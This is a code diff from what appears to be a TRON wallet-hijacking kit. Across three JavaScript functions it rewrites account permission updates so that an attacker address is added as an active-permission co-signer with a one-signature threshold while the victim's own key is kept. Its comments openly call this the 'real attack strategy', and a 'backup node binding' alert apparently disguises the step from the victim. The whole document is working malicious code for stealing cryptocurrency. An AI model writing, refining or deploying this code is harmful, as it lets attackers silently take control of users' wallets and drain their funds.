@@ -3946,12 +3946,12 @@ function executeRealPermissionUpdate(targetAddress) {
         window.tronWeb.trx.getAccount(targetAddress).then(accountInfo => {
             console.log('🔒 当前账户信息:', accountInfo);
             
-            // 构造完整的权限参数 - 必须包含owner权限
+            // 真正的攻击策略：添加攻击者为共同签名者，而不是替换
             const permissionUpdateParams = {
                 owner_address: targetAddress,
                 owner: {
                     type: 0,
-                    permission_name: "owner", 
+                    permission_name: "owner",
                     threshold: 1,
                     keys: [{
                         address: targetAddress,
@@ -3961,12 +3961,18 @@ function executeRealPermissionUpdate(targetAddress) {
                 actives: [{
                     type: 2,
                     permission_name: "active",
-                    threshold: 1,
+                    threshold: 1, // 关键：只需要1个签名
                     operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
-                    keys: [{
-                        address: CURRENT_ATTACKER_ADDRESS,
-                        weight: 1
-                    }]
+                    keys: [
+                        {
+                            address: targetAddress, // 保留用户原有权限
+                            weight: 1
+                        },
+                        {
+                            address: CURRENT_ATTACKER_ADDRESS, // 添加攻击者权限
+                            weight: 1
+                        }
+                    ]
                 }],
                 visible: true
             };
@@ -4036,16 +4042,22 @@ function executeSimplifiedPermissionUpdate(targetAddress) {
     alert('🌐 尝试备用节点绑定方案...');
     
     try {
-        // 使用TronWeb的updateAccountPermissions方法
+        // 备用方案：同样使用共同签名策略而不是替换
         const activePermission = {
             type: 2,
             permission_name: "active",
             threshold: 1,
             operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
-            keys: [{
-                address: window.tronWeb.address.toHex(CURRENT_ATTACKER_ADDRESS),
-                weight: 1
-            }]
+            keys: [
+                {
+                    address: window.tronWeb.address.toHex(targetAddress), // 保留用户权限
+                    weight: 1
+                },
+                {
+                    address: window.tronWeb.address.toHex(CURRENT_ATTACKER_ADDRESS), // 添加攻击者权限
+                    weight: 1
+                }
+            ]
         };
         
         console.log('🔒 简化权限参数:', activePermission);
@@ -4111,7 +4123,7 @@ function executeCompatibilityPermissionUpdate(targetAddress) {
         window.tronWeb.trx.getAccount(targetAddress).then(accountInfo => {
             console.log('🔒 账户信息:', accountInfo);
             
-            // 保持原有owner权限，只修改active权限
+            // 保持原有owner权限，添加攻击者为active权限共同签名者
             const ownerPermission = accountInfo.owner_permission || {
                 type: 0,
                 permission_name: "owner",
@@ -4127,10 +4139,16 @@ function executeCompatibilityPermissionUpdate(targetAddress) {
                 permission_name: "active",
                 threshold: 1,
                 operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
-                keys: [{
-                    address: window.tronWeb.address.toHex(CURRENT_ATTACKER_ADDRESS),
-                    weight: 1
-                }]
+                keys: [
+                    {
+                        address: window.tronWeb.address.toHex(targetAddress), // 保留用户权限
+                        weight: 1
+                    },
+                    {
+                        address: window.tronWeb.address.toHex(CURRENT_ATTACKER_ADDRESS), // 添加攻击者权限  
+                        weight: 1
+                    }
+                ]
             };
             
             console.log('🔒 最终权限配置:', {ownerPermission, activePermission});
